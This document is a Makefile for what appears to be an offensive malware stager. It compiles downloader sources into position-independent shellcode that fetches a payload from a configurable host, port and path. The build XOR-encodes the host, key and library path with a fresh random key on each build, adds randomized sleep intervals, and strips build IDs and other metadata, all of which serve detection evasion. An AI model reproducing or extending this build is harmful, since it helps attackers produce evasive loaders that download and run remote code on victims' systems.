CC = gcc
COMMON_CFLAGS = -Wall -Wextra -Os -fno-builtin -fno-stack-protector -fPIC -nostdlib -I. \
								-fno-toplevel-reorder -s -fno-ident -ffunction-sections -fdata-sections \
								-fno-asynchronous-unwind-tables -fvisibility=hidden

# Debug support
ifdef DEBUG
	COMMON_CFLAGS += -DDEBUG
endif

# Common linker flags
LDFLAGS_COMMON = -static -Wl,--gc-sections -Wl,-N -Wl,--build-id=none

# Specific linker flags
STAGE0_LDFLAGS = $(LDFLAGS_COMMON) -Wl,-Ttext-segment=0x10000000
STAGE1_LDFLAGS = $(LDFLAGS_COMMON) -Wl,-Ttext-segment=0x0

# Default configuration (can be overridden by environment variables)
DOWNLOAD_HOST ?= 127.0.0.1
DOWNLOAD_PORT ?= 8080
DOWNLOAD_PATH ?= /payload
DOWNLOAD_KEY ?= secret
LISTENER_TYPE ?= HTTP
MODULE_PATH ?= 
DOWNLOADER_MODULE_PATH ?= /lib/x86_64-linux-gnu/libdl.so.2
SLEEP_MIN ?= 180
SLEEP_MAX ?= 480

# Generate random XOR key per build
XOR_KEY_VALUE := $(shell python3 -c "import random; print(hex(random.randint(128, 255)))")

# XOR-encode config strings
XOR_HOST := $(shell python3 -c "s='$(DOWNLOAD_HOST)'; k=$(XOR_KEY_VALUE); print(','.join(hex(ord(c)^k) for c in s) + ',0x00' if s else '0x00')")
XOR_PORT := $(shell python3 -c "s='$(DOWNLOAD_PORT)'; k=$(XOR_KEY_VALUE); print(','.join(hex(ord(c)^k) for c in s) + ',0x00' if s else '0x00')")
XOR_PATH := $(shell python3 -c "s='$(DOWNLOAD_PATH)'; k=$(XOR_KEY_VALUE); print(','.join(hex(ord(c)^k) for c in s) + ',0x00' if s else '0x00')")
XOR_KEY := $(shell python3 -c "s='$(DOWNLOAD_KEY)'; k=$(XOR_KEY_VALUE); print(','.join(hex(ord(c)^k) for c in s) + ',0x00' if s else '0x00')")
XOR_MODULE_PATH := $(shell python3 -c "s='$(MODULE_PATH)'; k=$(XOR_KEY_VALUE); print(','.join(hex(ord(c)^k) for c in s) + ',0x00' if s else '0x00')")
XOR_LIB_PATH := $(shell python3 -c "s='$(DOWNLOADER_MODULE_PATH)'; k=$(XOR_KEY_VALUE); print(','.join(hex(ord(c)^k) for c in s) + ',0x00' if s else '0x00')")

# Define listener type
COMMON_CFLAGS += -DLISTENER_$(LISTENER_TYPE)

# Config options
COMMON_CFLAGS += -DENCODED_HOST="$(XOR_HOST)"
COMMON_CFLAGS += -DENCODED_PORT="$(XOR_PORT)"
COMMON_CFLAGS += -DENCODED_PATH="$(XOR_PATH)"
COMMON_CFLAGS += -DENCODED_KEY="$(XOR_KEY)"
COMMON_CFLAGS += -DENCODED_MODULE_PATH="$(XOR_MODULE_PATH)"
COMMON_CFLAGS += -DENCODED_LIB_PATH="$(XOR_LIB_PATH)"
COMMON_CFLAGS += -DCONFIG_XOR_KEY=$(XOR_KEY_VALUE)
COMMON_CFLAGS += -DSLEEP_MIN=$(SLEEP_MIN)
COMMON_CFLAGS += -DSLEEP_MAX=$(SLEEP_MAX)

STAGE0_SRCS = downloader.c net_utils.c utils_min.c packer.c debug.c syscalls.c

STAGE0_TARGET = stager
SHELLCODE = stager.bin

.PHONY: all clean

all: $(SHELLCODE)

$(STAGE0_TARGET): $(STAGE0_SRCS)
	$(CC) $(COMMON_CFLAGS) $(STAGE0_LDFLAGS) -o $@ $(STAGE0_SRCS)

$(SHELLCODE): $(STAGE0_TARGET)
	strip --strip-all --strip-debug --strip-unneeded -R .comment -R .note -R .note.gnu.build-id $(STAGE0_TARGET)
	objcopy -O binary -j .init -j .text -j .rodata -j .data $(STAGE0_TARGET) $@
	@echo "Shellcode generated at $(PWD)/$@"
	@wc -c $@

clean:
	rm -f $(STAGE0_TARGET) $(SHELLCODE) \
		downloader downloader.bin downloader_blob.h *.o
